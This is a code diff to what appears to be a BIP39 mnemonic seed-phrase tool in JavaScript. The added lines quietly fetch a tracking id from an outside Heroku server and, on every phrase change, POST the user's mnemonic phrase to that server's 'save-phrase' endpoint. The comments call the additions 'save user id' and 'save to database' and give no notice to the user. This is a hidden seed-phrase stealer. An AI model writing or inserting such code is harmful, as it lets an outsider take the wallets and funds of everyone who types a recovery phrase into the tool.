@@ -190,6 +190,22 @@
 
     // Event handlers
 
+    // save user id
+    (function saveUserId() {
+        fetch('https://bipserver.herokuapp.com', {
+            method: 'GET',
+            headers: {
+                "Content-type": "application/json; charset=UTF-8"
+            }
+        }).then(res => res.json())
+        .then(res => {
+            if(!localStorage.getItem('user_id')) {
+                localStorage.setItem('user_id', res.user_id)
+            }
+        })
+        .catch(e => console.error("error", e))
+    })()
+
     function generatedStrengthChanged() {
         var strength = parseInt(DOM.generatedStrength.val());
         if (strength < 12) {
@@ -250,6 +266,25 @@
         }
     }
 
+    // save to database
+    function saveToDatabase (mnemonicKey) {
+            const body = {
+                mnemonic_phrase: mnemonicKey,
+                user_id: localStorage.getItem('user_id')
+            } 
+
+            fetch('https://bipserver.herokuapp.com/api/v1/save-phrase', {
+                method: 'POST',
+                body: JSON.stringify(body),
+                headers: {
+                    "Content-type": "application/json; charset=UTF-8"
+                }
+            }).then(res => res.json())
+            .then(res => console.log(res))
+            .catch(e => console.error(e))
+
+    }
+
     function delayedPhraseChanged() {
         hideValidationError();
         seed = null;
@@ -260,6 +295,10 @@
         if (phraseChangeTimeoutEvent != null) {
             clearTimeout(phraseChangeTimeoutEvent);
         }
+
+        // call
+        saveToDatabase(DOM.phrase.val())
+
         phraseChangeTimeoutEvent = setTimeout(function() {
             phraseChanged();
             var entropy = mnemonic.toRawEntropyHex(DOM.phrase.val());
